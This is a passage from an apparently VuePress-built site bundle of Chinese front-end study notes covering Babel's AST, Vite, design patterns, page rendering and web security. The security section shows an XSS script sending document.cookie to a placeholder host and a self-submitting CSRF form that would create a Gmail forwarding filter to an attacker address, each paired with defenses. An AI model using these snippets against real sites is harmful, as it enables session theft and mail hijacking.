mixin和组件出现多对多关系时，导致代码复杂度较高',charsets:{cjk:!0}},{title:"babel",frontmatter:{title:"babel"},regularPath:"/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/babel.html",relativePath:"webstudy/工程化/babel.md",key:"v-03980d56",path:"/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/babel.html",headers:[{level:2,title:"原理",slug:"原理",normalizedTitle:"原理",charIndex:63},{level:3,title:"词法分析",slug:"词法分析",normalizedTitle:"词法分析",charIndex:131},{level:3,title:"语法分析",slug:"语法分析",normalizedTitle:"语法分析",charIndex:136}],headersStr:"原理 词法分析 语法分析",content:'# babel\n\n * js的编译器\n * 将es5以上的代码转行成向下兼容的js语法，使代码可运行在低版本浏览器上\n\n\n# 原理\n\n转译的三个阶段\n\n * 1.解析阶段段：Babel 默认使用@babel/parser将代码转换为AST。解析一般分为两个阶段：词法分析和语法分析\n * 2.转换阶段：Babel 使用 @babel/traverse 提供的方法对AST进行深度优先遍历，调用插件对关注节点的处理函数，按需对AST节点进行增删改操作\n * 3.生成阶段：Babel 默认使用@babel/generator将上一阶段处理后的AST通过深度优先遍历转换为代码字符串\n\n\n\n\n\n举个例子 AST的生成\n\nif (1 > 0) {\n    alert(\'hi\');\n}\n//\n{\n  "type": "Program",                          // 程序根节点\n  "body": [                                   // 一个数组包含所有程序的顶层语句\n    {\n      "type": "IfStatement",                  // 一个if语句节点\n      "test": {                               // if语句的判断条件\n        "type": "BinaryExpression",           // 一个双元运算表达式节点\n        "operator": ">",                      // 运算表达式的运算符\n        "left": {                             // 运算符左侧值\n          "type": "Literal",                  // 一个常量表达式\n          "value": 1                          // 常量表达式的常量值\n        },\n        "right": {                            // 运算符右侧值\n          "type": "Literal",\n          "value": 0\n        }\n      },\n      "consequent": {                         // if语句条件满足时的执行内容\n        "type": "BlockStatement",             // 用{}包围的代码块\n        "body": [                             // 代码块内的语句数组\n          {\n            "type": "ExpressionStatement",    // 一个表达式语句节点\n            "expression": {\n              "type": "CallExpression",       // 一个函数调用表达式节点\n              "callee": {                     // 被调用者\n                "type": "Identifier",         // 一个标识符表达式节点\n                "name": "alert"\n              },\n              "arguments": [                  // 调用参数\n                {\n                  "type": "Literal",\n                  "value": "hi"\n                }\n              ]\n            }\n          }\n        ]\n      },\n      "alternative": null                     // if语句条件未满足时的执行内容\n    }\n  ]\n}\n\n\n\n# 词法分析\n\n词法分析阶段可以看成是对代码进行“分词”，它接收一段源代码，然后执行一段tokenize函数，把代码分割成被称为Tokens的东西。Tokens是一个数组，由一些代码的碎片组成，如下\n\n[\n    { "type": "Keyword", "value": "const" },\n    { "type": "Identifier", "value": "add" },\n    { "type": "Punctuator", "value": "=" },\n    { "type": "Punctuator", "value": "(" },\n    { "type": "Identifier", "value": "a" },\n    { "type": "Punctuator", "value": "," },\n    { "type": "Identifier", "value": "b" },\n    { "type": "Punctuator", "value": ")" },\n    { "type": "Punctuator", "value": "=>" },\n    { "type": "Identifier", "value": "a" },\n    { "type": "Punctuator", "value": "+" },\n    { "type": "Identifier", "value": "b" }\n]\n\n\n\n\n# 语法分析\n\n词法分析之后，代码就已经变成了一个Tokens数组了，现在需要通过语法分析把Tokens转化成AST',normalizedContent:'# babel\n\n * js的编译器\n * 将es5以上的代码转行成向下兼容的js语法，使代码可运行在低版本浏览器上\n\n\n# 原理\n\n转译的三个阶段\n\n * 1.解析阶段段：babel 默认使用@babel/parser将代码转换为ast。解析一般分为两个阶段：词法分析和语法分析\n * 2.转换阶段：babel 使用 @babel/traverse 提供的方法对ast进行深度优先遍历，调用插件对关注节点的处理函数，按需对ast节点进行增删改操作\n * 3.生成阶段：babel 默认使用@babel/generator将上一阶段处理后的ast通过深度优先遍历转换为代码字符串\n\n\n\n\n\n举个例子 ast的生成\n\nif (1 > 0) {\n    alert(\'hi\');\n}\n//\n{\n  "type": "program",                          // 程序根节点\n  "body": [                                   // 一个数组包含所有程序的顶层语句\n    {\n      "type": "ifstatement",                  // 一个if语句节点\n      "test": {                               // if语句的判断条件\n        "type": "binaryexpression",           // 一个双元运算表达式节点\n        "operator": ">",                      // 运算表达式的运算符\n        "left": {                             // 运算符左侧值\n          "type": "literal",                  // 一个常量表达式\n          "value": 1                          // 常量表达式的常量值\n        },\n        "right": {                            // 运算符右侧值\n          "type": "literal",\n          "value": 0\n        }\n      },\n      "consequent": {                         // if语句条件满足时的执行内容\n        "type": "blockstatement",             // 用{}包围的代码块\n        "body": [                             // 代码块内的语句数组\n          {\n            "type": "expressionstatement",    // 一个表达式语句节点\n            "expression": {\n              "type": "callexpression",       // 一个函数调用表达式节点\n              "callee": {                     // 被调用者\n                "type": "identifier",         // 一个标识符表达式节点\n                "name": "alert"\n              },\n              "arguments": [                  // 调用参数\n                {\n                  "type": "literal",\n                  "value": "hi"\n                }\n              ]\n            }\n          }\n        ]\n      },\n      "alternative": null                     // if语句条件未满足时的执行内容\n    }\n  ]\n}\n\n\n\n# 词法分析\n\n词法分析阶段可以看成是对代码进行“分词”，它接收一段源代码，然后执行一段tokenize函数，把代码分割成被称为tokens的东西。tokens是一个数组，由一些代码的碎片组成，如下\n\n[\n    { "type": "keyword", "value": "const" },\n    { "type": "identifier", "value": "add" },\n    { "type": "punctuator", "value": "=" },\n    { "type": "punctuator", "value": "(" },\n    { "type": "identifier", "value": "a" },\n    { "type": "punctuator", "value": "," },\n    { "type": "identifier", "value": "b" },\n    { "type": "punctuator", "value": ")" },\n    { "type": "punctuator", "value": "=>" },\n    { "type": "identifier", "value": "a" },\n    { "type": "punctuator", "value": "+" },\n    { "type": "identifier", "value": "b" }\n]\n\n\n\n\n# 语法分析\n\n词法分析之后，代码就已经变成了一个tokens数组了，现在需要通过语法分析把tokens转化成ast',charsets:{cjk:!0}},{title:"Vite",frontmatter:{tile:"Vite"},regularPath:"/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/vite.html",relativePath:"webstudy/工程化/vite.md",key:"v-7550340d",path:"/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/vite.html",headers:[{level:2,title:"Vite为什么快",slug:"vite为什么快",normalizedTitle:"vite为什么快",charIndex:11},{level:3,title:"webpack为什么慢？",slug:"webpack为什么慢",normalizedTitle:"webpack为什么慢？",charIndex:31},{level:3,title:"vite怎么做的",slug:"vite怎么做的",normalizedTitle:"vite怎么做的",charIndex:255}],headersStr:"Vite为什么快 webpack为什么慢？ vite怎么做的",content:"# Vite\n\n\n# Vite为什么快\n\n这个问题前可以先了解webpack为什么慢？\n\n\n# webpack为什么慢？\n\n * 浏览器中没有模块化的设计，所以webpack需要吧代码编译进一个js文件中然后浏览器才可以解析使用\n * 所以当我们启动项目时，webpack需要从入口文件去索引整个项目的文件，编译成一个或多个单独的js文件，即使采用了代码拆分，也需要一次生成所有路由下的编译后文件，这也导致了服务启动时间随着项目复杂度而指数增长\n * 所以说其实代码拆分对开发模式下的性能没有帮助\n\n\n\n\n# vite怎么做的\n\n * Vite启动开发服务器的时候并不需要提前编译文件\n * 而是在浏览器请求对应URL的时候，再提供对应的文件\n * 这就实现了在使用了路由懒加载的项目中，仅提供对应路由下的模块的编译文件，而没有索引全部代码的这一过程\n * 项目启动时间始终为常量级。并不会随着项目复杂度变高而一直增长\n\n\n\n# Esbuild\n\n * Vite中是并没有loader功能，Vite使用esbuild作为部分文件类型的解析器(如 TSX & TypeScript),\n * Vite 并不会与 webpack 一样，提前将所有文件编译为浏览器可以接受的类型，而是在接收到浏览器发起的 http 请求之后再去编译对应文件，提供给浏览器",normalizedContent:"# vite\n\n\n# vite为什么快\n\n这个问题前可以先了解webpack为什么慢？\n\n\n# webpack为什么慢？\n\n * 浏览器中没有模块化的设计，所以webpack需要吧代码编译进一个js文件中然后浏览器才可以解析使用\n * 所以当我们启动项目时，webpack需要从入口文件去索引整个项目的文件，编译成一个或多个单独的js文件，即使采用了代码拆分，也需要一次生成所有路由下的编译后文件，这也导致了服务启动时间随着项目复杂度而指数增长\n * 所以说其实代码拆分对开发模式下的性能没有帮助\n\n\n\n\n# vite怎么做的\n\n * vite启动开发服务器的时候并不需要提前编译文件\n * 而是在浏览器请求对应url的时候，再提供对应的文件\n * 这就实现了在使用了路由懒加载的项目中，仅提供对应路由下的模块的编译文件，而没有索引全部代码的这一过程\n * 项目启动时间始终为常量级。并不会随着项目复杂度变高而一直增长\n\n\n\n# esbuild\n\n * vite中是并没有loader功能，vite使用esbuild作为部分文件类型的解析器(如 tsx & typescript),\n * vite 并不会与 webpack 一样，提前将所有文件编译为浏览器可以接受的类型，而是在接收到浏览器发起的 http 请求之后再去编译对应文件，提供给浏览器",charsets:{cjk:!0}},{title:"安全",frontmatter:{title:"安全"},regularPath:"/webstudy/%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/%E5%AE%89%E5%85%A8.html",relativePath:"webstudy/运行环境/安全.md",key:"v-3eb3b24c",path:"/webstudy/%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/%E5%AE%89%E5%85%A8.html",headers:[{level:2,title:"网络安全攻击",slug:"网络安全攻击",normalizedTitle:"网络安全攻击",charIndex:9},{level:3,title:"XSS",slug:"xss",normalizedTitle:"xss",charIndex:20},{level:3,title:"CSRF",slug:"csrf",normalizedTitle:"csrf",charIndex:54},{level:3,title:"点击劫持 Clickjacking",slug:"点击劫持-clickjacking",normalizedTitle:"点击劫持 clickjacking",charIndex:1785},{level:3,title:"## SQL 注入",slug:"sql-注入",normalizedTitle:"## sql 注入",charIndex:2130}],headersStr:"网络安全攻击 XSS CSRF 点击劫持 Clickjacking ## SQL 注入",content:'# 安全\n\n\n# 网络安全攻击\n\n * XSSCross Site Scripting 跨站脚本攻击\n * CSRFCross-site request forgery 跨站请求伪造\n * 点击劫持\n\n\n# XSS\n\nXSS(Cross Site Scripting跨站脚本)。XSS定义的主语是“脚本”，是一种跨站执行的脚本，也就是javascript脚本，指的是在网站上注入我们的javascript脚本，执行非法操作。 比如input框，文本编辑器输入一些内容\n\n# 场景\n\n<script>\n  var img = document.createElement(\'img\')\n  img.src = \'http://xxx.com/api/xxx?info=\' + document.cookie \n  //执行此代码，就会将攻击的cookie提交到自己制定的服务器中\n<\/script>\n\n\n# 解决\n\n * 替换字符串\n\nconst newStr = str.replaceAll(\'<\', \'&lt;\').replaceAll(\'>\', \'&gt;\')\n\n\n * 借助第三方工具 https://www.npmjs.com/package/xss\n\n# Vue和React默认已屏蔽Xss攻击\n\n但下面的场景会开启\n\n * Vue v-html\n * React dangerouslySetInnerHTML\n\n\n# CSRF\n\nCSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。CSRF定义的主语是”请求“，是一种跨站的伪造的请求，指的是跨站伪造用户的请求，模拟用户的操作\n\n# 场景\n\n请看下面的故事\n\n * 小明登录了 Gmail 邮箱，收到一封广告邮件 “转让比特币，只要 998”\n * 小明抱着好奇的心态点开看了看，发现是个空白页面，就关闭了 但此时，攻击已经完成了。黑客在这个空白页面设置了 js 代码，会让小明的邮件都转发到 hacker@hackermail.com 。\n   因为小明已经登录了 Gmail ，有了 Gmail 的 cookie 。所以再去请求 Gmail API 就会带着 cookie ，就有可能成功。\n\n<form method="POST" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data"> \n    <input type="hidden" name="cf2_emc" value="true"/> \n    <input type="hidden" name="cf2_email" value="hacker@hakermail.com"/> \n    .....\n    <input type="hidden" name="irf" value="on"/> \n    <input type="hidden" name="nvp_bu_cftb" value="Create Filter"/> \n</form> \n<script> \n    document.forms[0].submit();\n\n    // PS：有些是 post 请求，有些是 get 请求\n    //     get 请求如果用 img.src 还可以规避跨域，更加危险\n<\/script>\n\n\n# CSRF 的过程\n\n * 用户登录了 a.com ，有了 cookie\n * 黑客引诱用户访问 b.com 网页，并在其中发起一个跨站请求 a.com/api/xxx\n * a.com API 收到 cookie ，误以为是真实用户的请求，就受理了\n\n# 解决cookie跨域\n\n * 严格的跨域请求限制\n * 为 cookie 设置 SameSite 不随跨域请求被发送 Set-Cookie: key1=val1; key2=val2; SameSite=Strict;\n * 关键接口使用短信验证码等双重验证\n\n\n# 点击劫持 Clickjacking\n\n点击劫持的原理：黑客在自己的网站，使用隐藏的 <iframe> 嵌入其他网页，诱导用户按顺序点击。\n\n钓鱼网站\n\n使用 JS 预防\n\nif (top.location.hostname !== self.location.hostname) {\n    alert("您正在访问不安全的页面，即将跳转到安全页面！")\n    top.location.href = self.location.href\n}\n\n\n# 解决\n\n增加 http header X-Frame-Options:SAMEORIGIN ，让 <iframe> 只能加载同域名的网页。\n\nPS：点击劫持，攻击那些需要用户点击操作的行为。CSRF 不需要用户知道，偷偷完成。\n\n\n# ## SQL 注入',normalizedContent:'# 安全\n\n\n# 网络安全攻击\n\n * xsscross site scripting 跨站脚本攻击\n * csrfcross-site request forgery 跨站请求伪造\n * 点击劫持\n\n\n# xss\n\nxss(cross site scripting跨站脚本)。xss定义的主语是“脚本”，是一种跨站执行的脚本，也就是javascript脚本，指的是在网站上注入我们的javascript脚本，执行非法操作。 比如input框，文本编辑器输入一些内容\n\n# 场景\n\n<script>\n  var img = document.createelement(\'img\')\n  img.src = \'http://xxx.com/api/xxx?info=\' + document.cookie \n  //执行此代码，就会将攻击的cookie提交到自己制定的服务器中\n<\/script>\n\n\n# 解决\n\n * 替换字符串\n\nconst newstr = str.replaceall(\'<\', \'&lt;\').replaceall(\'>\', \'&gt;\')\n\n\n * 借助第三方工具 https://www.npmjs.com/package/xss\n\n# vue和react默认已屏蔽xss攻击\n\n但下面的场景会开启\n\n * vue v-html\n * react dangerouslysetinnerhtml\n\n\n# csrf\n\ncsrf（cross-site request forgery跨站请求伪造，也被称为“one click attack”或者session riding，通常缩写为csrf或者xsrf，是一种对网站的恶意利用。csrf定义的主语是”请求“，是一种跨站的伪造的请求，指的是跨站伪造用户的请求，模拟用户的操作\n\n# 场景\n\n请看下面的故事\n\n * 小明登录了 gmail 邮箱，收到一封广告邮件 “转让比特币，只要 998”\n * 小明抱着好奇的心态点开看了看，发现是个空白页面，就关闭了 但此时，攻击已经完成了。黑客在这个空白页面设置了 js 代码，会让小明的邮件都转发到 hacker@hackermail.com 。\n   因为小明已经登录了 gmail ，有了 gmail 的 cookie 。所以再去请求 gmail api 就会带着 cookie ，就有可能成功。\n\n<form method="post" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data"> \n    <input type="hidden" name="cf2_emc" value="true"/> \n    <input type="hidden" name="cf2_email" value="hacker@hakermail.com"/> \n    .....\n    <input type="hidden" name="irf" value="on"/> \n    <input type="hidden" name="nvp_bu_cftb" value="create filter"/> \n</form> \n<script> \n    document.forms[0].submit();\n\n    // ps：有些是 post 请求，有些是 get 请求\n    //     get 请求如果用 img.src 还可以规避跨域，更加危险\n<\/script>\n\n\n# csrf 的过程\n\n * 用户登录了 a.com ，有了 cookie\n * 黑客引诱用户访问 b.com 网页，并在其中发起一个跨站请求 a.com/api/xxx\n * a.com api 收到 cookie ，误以为是真实用户的请求，就受理了\n\n# 解决cookie跨域\n\n * 严格的跨域请求限制\n * 为 cookie 设置 samesite 不随跨域请求被发送 set-cookie: key1=val1; key2=val2; samesite=strict;\n * 关键接口使用短信验证码等双重验证\n\n\n# 点击劫持 clickjacking\n\n点击劫持的原理：黑客在自己的网站，使用隐藏的 <iframe> 嵌入其他网页，诱导用户按顺序点击。\n\n钓鱼网站\n\n使用 js 预防\n\nif (top.location.hostname !== self.location.hostname) {\n    alert("您正在访问不安全的页面，即将跳转到安全页面！")\n    top.location.href = self.location.href\n}\n\n\n# 解决\n\n增加 http header x-frame-options:sameorigin ，让 <iframe> 只能加载同域名的网页。\n\nps：点击劫持，攻击那些需要用户点击操作的行为。csrf 不需要用户知道，偷偷完成。\n\n\n# ## sql 注入',charsets:{cjk:!0}},{title:"设计模式",frontmatter:{title:"设计模式"},regularPath:"/webstudy/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html",relativePath:"webstudy/设计模式/设计模式.md",key:"v-59f4c2ee",path:"/webstudy/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html",headers:[{level:2,title:"设计原则",slug:"设计原则",normalizedTitle:"设计原则",charIndex:11},{level:2,title:"1、工厂模式",slug:"_1、工厂模式",normalizedTitle:"1、工厂模式",charIndex:45},{level:2,title:"2、单例模式",slug:"_2、单例模式",normalizedTitle:"2、单例模式",charIndex:135},{level:2,title:"3、代理模式",slug:"_3、代理模式",normalizedTitle:"3、代理模式",charIndex:711},{level:2,title:"4、观察者模式",slug:"_4、观察者模式",normalizedTitle:"4、观察者模式",charIndex:805},{level:2,title:"5、发布订阅模式",slug:"_5、发布订阅模式",normalizedTitle:"5、发布订阅模式",charIndex:946},{level:2,title:"6、装饰器模式",slug:"_6、装饰器模式",normalizedTitle:"6、装饰器模式",charIndex:1137}],headersStr:"设计原则 1、工厂模式 2、单例模式 3、代理模式 4、观察者模式 5、发布订阅模式 6、装饰器模式",content:"# 设计模式\n\n\n# 设计原则\n\n开放封闭原则是最重要的：对扩展开放，对修改封闭\n\n\n# 1、工厂模式\n\nclass Foo { \n}\n\nfunction factory(): Foo {\n    return new Foo(...arguments)\n}\n\n\n\n# 2、单例模式\n\n提供全局唯一的对象，无论获取多少次\n\nclass SingleTon {\n    public static instance:SingleTon|null = null\n    private constructor() {}\n    public static getInstance(): SingleTon {\n      //缓存instance\n      if(this.instance == null){\n        this.instance = new SingleTon()\n      }\n      return this.instance\n    }\n    fn1() {}\n    fn2() {}\n}\n\nconst s1 = new SingleTon() // Error: constructor of 'singleton' is private\n\nconst s2 = SingleTon.getInstance()\ns2.fn1()\ns2.fn2()\n\nconst s3 = SingleTon.getInstance()\ns2 === s3 // true\n\n\n应用场景\n\n * Vuex Redux 的 store ，全局唯一的\n * 全局唯一的 dialog modal\n\n\n# 3、代理模式\n\n使用者不能直接访问真实数据，而是通过一个代理层来访问。 ES Proxy 本身就是代理模式，Vue3 基于它来实现响应式\n\n应用场景\n\n * Vue3的proxy\n\n\n# 4、观察者模式\n\n即常说的绑定事件。一个主题，一个观察者，主题变化之后触发观察者执行。\n\n// 一个主题，一个观察者，主题变化之后触发观察者执行\nbtn.addEventListener('click', () => { ... })\n\n\n场景:\n\n * Vue响应式原理\n\n\n# 5、发布订阅模式\n\n即常说的自定义事件，一个 event 对象，可以绑定事件，可以触发事件 Vue中的事件总线传参\n\n// 绑定\nevent.on('event-key', () => {\n    // 事件1\n})\nevent.on('event-key', () => {\n    // 事件2\n})\n\n// 触发执行\nevent.emit('event-key')\n\n\n\n# 6、装饰器模式\n\nES 和 TS 的 Decorator 语法就是装饰器模式。可以为 class 和 method 增加新的功能。\n\nVue+ts的代码中用的就是装饰器模式\n\nimport { Vue, Prop,Emit ,Component} from 'vue-property-decorator'\n@Component({\n  components: {\n    HelloWorld\n  }\n})\nclass Demo extends Vue {\n  @Prop({ required: true, type: String }) msg\n  @Emit('custom')\n  @Provide() msg = this.msg\n  msg:string = 'this is decorator'\n}\n",normalizedContent:"# 设计模式\n\n\n# 设计原则\n\n开放封闭原则是最重要的：对扩展开放，对修改封闭\n\n\n# 1、工厂模式\n\nclass foo { \n}\n\nfunction factory(): foo {\n    return new foo(...arguments)\n}\n\n\n\n# 2、单例模式\n\n提供全局唯一的对象，无论获取多少次\n\nclass singleton {\n    public static instance:singleton|null = null\n    private constructor() {}\n    public static getinstance(): singleton {\n      //缓存instance\n      if(this.instance == null){\n        this.instance = new singleton()\n      }\n      return this.instance\n    }\n    fn1() {}\n    fn2() {}\n}\n\nconst s1 = new singleton() // error: constructor of 'singleton' is private\n\nconst s2 = singleton.getinstance()\ns2.fn1()\ns2.fn2()\n\nconst s3 = singleton.getinstance()\ns2 === s3 // true\n\n\n应用场景\n\n * vuex redux 的 store ，全局唯一的\n * 全局唯一的 dialog modal\n\n\n# 3、代理模式\n\n使用者不能直接访问真实数据，而是通过一个代理层来访问。 es proxy 本身就是代理模式，vue3 基于它来实现响应式\n\n应用场景\n\n * vue3的proxy\n\n\n# 4、观察者模式\n\n即常说的绑定事件。一个主题，一个观察者，主题变化之后触发观察者执行。\n\n// 一个主题，一个观察者，主题变化之后触发观察者执行\nbtn.addeventlistener('click', () => { ... })\n\n\n场景:\n\n * vue响应式原理\n\n\n# 5、发布订阅模式\n\n即常说的自定义事件，一个 event 对象，可以绑定事件，可以触发事件 vue中的事件总线传参\n\n// 绑定\nevent.on('event-key', () => {\n    // 事件1\n})\nevent.on('event-key', () => {\n    // 事件2\n})\n\n// 触发执行\nevent.emit('event-key')\n\n\n\n# 6、装饰器模式\n\nes 和 ts 的 decorator 语法就是装饰器模式。可以为 class 和 method 增加新的功能。\n\nvue+ts的代码中用的就是装饰器模式\n\nimport { vue, prop,emit ,component} from 'vue-property-decorator'\n@component({\n  components: {\n    helloworld\n  }\n})\nclass demo extends vue {\n  @prop({ required: true, type: string }) msg\n  @emit('custom')\n  @provide() msg = this.msg\n  msg:string = 'this is decorator'\n}\n",charsets:{cjk:!0}},{title:"网页的加载和渲染",frontmatter:{title:"网页的加载和渲染"},regularPath:"/webstudy/%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/%E7%BD%91%E9%A1%B5%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%B8%B2%E6%9F%93.html",relativePath:"webstudy/运行环境/网页的加载和渲染.md",key:"v-47ace465",path:"/webstudy/%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/%E7%BD%91%E9%A1%B5%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%B8%B2%E6%9F%93.html",headers:[{level:2,title:"运行环境",slug:"运行环境",normalizedTitle:"运行环境",charIndex:2},{level:2,title:"网页加载过程",slug:"网页加载过程",normalizedTitle:"网页加载过程",charIndex:28},{level:3,title:"加载的资源类型",slug:"加载的资源类型",normalizedTitle:"加载的资源类型",charIndex:69},{level:3,title:"加载过程",slug:"加载过程",normalizedTitle:"加载过程",charIndex:30},{level:3,title:"渲染过程",slug:"渲染过程",normalizedTitle:"渲染过程",charIndex:793},{level:3,title:"重排和重绘",slug:"重排和重绘",normalizedTitle:"重排和重绘",charIndex:1216},{level:3,title:"触发 css BFC 的条件",slug:"触发-css-bfc-的条件",normalizedTitle:"触发 css bfc 的条件",charIndex:2133}],headersStr:"运行环境 网页加载过程 加载的资源类型 加载过程 渲染过程 重排和重绘 触发 css BFC 的条件",content:"# 运行环境\n\n * 前端代码运行环境及浏览器\n\n\n# 网页加载过程\n\n从输入url到渲染出整个页面的过程这里主要考虑前端关注点\n\n\n# 加载的资源类型\n\n * html\n * 媒体文件：图片、视频等\n * js css\n\n\n# 加载过程\n\n * DNS解析(domain name server):将域名解析为ip地址\n * 浏览器根据ip地址向服务器发送请求\n * 服务器处理http请求，并返回给浏览器\n\n# 过于详细的过程(TCP连接)\n\n * 1.域名解析\n * 2.TCP连接 HTTP协议是使用TCP协议作为其传输层协议的，在拿到服务器的IP地址后，浏览器客户端会与服务器建立TCP连接。该过程包括三次握手： 第一次握手：建立连接时，客户端向服务端发送请求报文 第二次握手：服务器收到请求报文后，如同意连接，则向客户端发送确认报文 第三次握手，客户端收到服务器的确认后，再次向服务器给出确认报文，完成连接。 三次握手主要是为了防止已经失效的请求报文字段发送给服务器，浪费资源。\n * 3.浏览器发送HTTP请求 浏览器构建http请求报文，并通过TCP协议传送到服务器的指定端口。http请求报文一共包括三个部分： 请求行：指定http请求的方法、url、http协议版本等 请求头：描述浏览器的相关信息，语言、编码等。 请求正文：当发送POST, PUT等请求时，通常需要向服务器传递数据。这些数据就储存在请求正文中。\n * 4、服务器处理HTTP请求 服务器处理http请求，并返回响应报文。响应报文包括三个部分： 响应头：包含了响应的相关信息，如日期等 响应正文：服务器返回给浏览器的文本信息，通常的html、js、css、图片等就包含在这一部分里面。\n * 5、浏览器页面渲染 浏览器接受到http服务器发送过来的响应报文，并开始解析html文档，渲染页面。具体的渲染过程包括：构建DOM树、构建渲染树、定位页面元素、绘制页面元素等。\n * 6、断开TCP连接 客户端与服务器四次挥手，断开tcp连接。 第一次挥手：客户端想分手，发送消息给服务器 第二次挥手：服务器通知客户端已经接受到分手请求，但还没做好分手准备 第三次回收：服务器已经做好分手准备，通知客户端 第四次挥手：客户端发送消息给服务器，确定分手，服务器关闭连接\n\n\n# 渲染过程\n\n * 根据html代码生成Dom Tree\n * 根据css代码生产CSSOM(css object model)\n * 将DOM Tree和CSSOM整合形成Render Tree\n * 通过Render Tree渲染页面\n * 遇到 <script>则暂停渲染，先执行js代码，执行完成之后在继续\n * render tree渲染完成\n\n# js进程和渲染进程是同一进程\n\njs可能会改变dom结构，所以说遇到js先执行js，执行之后再继续渲染dom\n\n\n# 重排和重绘\n\n * 重绘：CSS 样式改变(例如：visibility，背景色的改变)，使浏览器需要根据新的属性进行绘制。\n * 重排：我们对DOM的修改引发了DOM几何元素的变化，渲染树需要重新计算，重新生成布局，重新排列元素。\n\n> 重绘不一定导致重排，但重排一定会导致重绘\n\n# 重排的原因\n\n当DOM的变化影响了元素的几何信息(元素的的位置和尺寸大小)，浏览器需要重新计算元素的几何属性，就会发生重排\n\n * 页面初始渲染就是一次重排\n * 添加/删除可见的DOM元素\n * 改变元素位置，改变元素尺寸，比如边距、填充、边框、宽度和高度等\n * 改变浏览器窗口尺寸，比如resize事件发生时\n * 激活CSS伪类（例如：:hover）\n * 设置 style 属性的值，因为通过设置style属性改变结点样式的话，每一次设置都会触发一次reflow\n * 查询某些属性或调用某些计算方法：offsetWidth、offsetHeight等\n\n# 优化重排\n\n * 集中修改样式，或直接使用 class\n * DOM 操作前先使用 display: none,absolute 或 fixed 脱离文档流\n * 使用 BFC ，不影响外部的元素\n * 对于频繁触发的操作（resize scroll 等）使用节流和防抖\n * 使用 createDocumentFragment 进行批量 DOM 操作\n * 优化动画，如使用 requestAnimationFrame 或者 CSS3（可启用 GPU 加速）\n\n//强制刷新 触发两次重排\ndiv.style.left = div.offsetLeft + 1 + 'px';\ndiv.style.top = div.offsetTop + 1 + 'px';\n//优化\n//缓存布局信息 相当于读写分离\nvar curLeft = div.offsetLeft;\nvar curTop = div.offsetTop;\ndiv.style.left = curLeft + 1 + 'px';\ndiv.style.top = curTop + 1 + 'px';\n\n\n\n# 触发 css BFC 的条件\n\nBFC - Block Formatting Context 块格式化上下文\n\n * 根节点 html\n * 设置 float left right\n * 设置 overflow auto scroll hidden\n * 设置 display inline-block table table-cell flex grid\n * 设置 position absolute fixed",normalizedContent:"# 运行环境\n\n * 前端代码运行环境及浏览器\n\n\n# 网页加载过程\n\n从输入url到渲染出整个页面的过程这里主要考虑前端关注点\n\n\n# 加载的资源类型\n\n * html\n * 媒体文件：图片、视频等\n * js css\n\n\n# 加载过程\n\n * dns解析(domain name server):将域名解析为ip地址\n * 浏览器根据ip地址向服务器发送请求\n * 服务器处理http请求，并返回给浏览器\n\n# 过于详细的过程(tcp连接)\n\n * 1.域名解析\n * 2.tcp连接 http协议是使用tcp协议作为其传输层协议的，在拿到服务器的ip地址后，浏览器客户端会与服务器建立tcp连接。该过程包括三次握手： 第一次握手：建立连接时，客户端向服务端发送请求报文 第二次握手：服务器收到请求报文后，如同意连接，则向客户端发送确认报文 第三次握手，客户端收到服务器的确认后，再次向服务器给出确认报文，完成连接。 三次握手主要是为了防止已经失效的请求报文字段发送给服务器，浪费资源。\n * 3.浏览器发送http请求 浏览器构建http请求报文，并通过tcp协议传送到服务器的指定端口。http请求报文一共包括三个部分： 请求行：指定http请求的方法、url、http协议版本等 请求头：描述浏览器的相关信息，语言、编码等。 请求正文：当发送post, put等请求时，通常需要向服务器传递数据。这些数据就储存在请求正文中。\n * 4、服务器处理http请求 服务器处理http请求，并返回响应报文。响应报文包括三个部分： 响应头：包含了响应的相关信息，如日期等 响应正文：服务器返回给浏览器的文本信息，通常的html、js、css、图片等就包含在这一部分里面。\n * 5、浏览器页面渲染 浏览器接受到http服务器发送过来的响应报文，并开始解析html文档，渲染页面。具体的渲染过程包括：构建dom树、构建渲染树、定位页面元素、绘制页面元素等。\n * 6、断开tcp连接 客户端与服务器四次挥手，断开tcp连接。 第一次挥手：客户端想分手，发送消息给服务器 第二次挥手：服务器通知客户端已经接受到分手请求，但还没做好分手准备 第三次回收：服务器已经做好分手准备，通知客户端 第四次挥手：客户端发送消息给服务器，确定分手，服务器关闭连接\n\n\n# 渲染过程\n\n * 根据html代码生成dom tree\n * 根据css代码生产cssom(css object model)\n * 将dom tree和cssom整合形成render tree\n * 通过render tree渲染页面\n * 遇到 <script>则暂停渲染，先执行js代码，执行完成之后在继续\n * render tree渲染完成\n\n# js进程和渲染进程是同一进程\n\njs可能会改变dom结构，所以说遇到js先执行js，执行之后再继续渲染dom\n\n\n# 重排和重绘\n\n * 重绘：css 样式改变(例如：visibility，背景色的改变)，使浏览器需要根据新的属性进行绘制。\n * 重排：我们对dom的修改引发了dom几何元素的变化，渲染树需要重新计算，重新生成布局，重新排列元素。\n\n> 重绘不一定导致重排，但重排一定会导致重绘\n\n# 重排的原因\n\n当dom的变化影响了元素的几何信息(元素的的位置和尺寸大小)，浏览器需要重新计算元素的几何属性，就会发生重排\n\n * 页面初始渲染就是一次重排\n * 添加/删除可见的dom元素\n * 改变元素位置，改变元素尺寸，比如边距、填充、边框、宽度和高度等\n * 改变浏览器窗口尺寸，比如resize事件发生时\n * 激活css伪类（例如：:hover）\n * 设置 